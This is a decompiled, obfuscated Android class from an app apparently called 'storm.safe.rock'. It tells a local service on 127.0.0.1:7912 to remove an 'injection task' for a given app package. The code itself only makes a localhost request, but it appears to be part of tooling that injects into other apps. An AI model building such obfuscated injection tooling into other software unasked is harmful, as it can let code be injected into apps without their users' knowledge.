package com.storm.safe.rock.service;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$removeInjectionTaskFromLocalService$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$removeInjectionTaskFromLocalService$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f52669a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$removeInjectionTaskFromLocalService$1(String str, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52669a1 = str;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$removeInjectionTaskFromLocalService$1(this.f52669a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$removeInjectionTaskFromLocalService$1 dqtvuisjd_removeinjectiontaskfromlocalservice_1 = (dqtvuisjd$removeInjectionTaskFromLocalService$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_removeinjectiontaskfromlocalservice_1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String str = this.f52669a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/injectionWatcher/removeTask?packageName=" + str).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setConnectTimeout(2000);
            httpURLConnection.setReadTimeout(2000);
            httpURLConnection.setRequestMethod("GET");
            int responseCode = httpURLConnection.getResponseCode();
            httpURLConnection.disconnect();
            t60.m214714d6("dqtvuisjd", "✅ 通知 local-service 移除注入任务: " + str + " → HTTP " + responseCode);
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 通知 local-service 移除任务失败: ", e.getMessage(), "dqtvuisjd");
        }
        return C1351vv.f60710b1;
    }
}
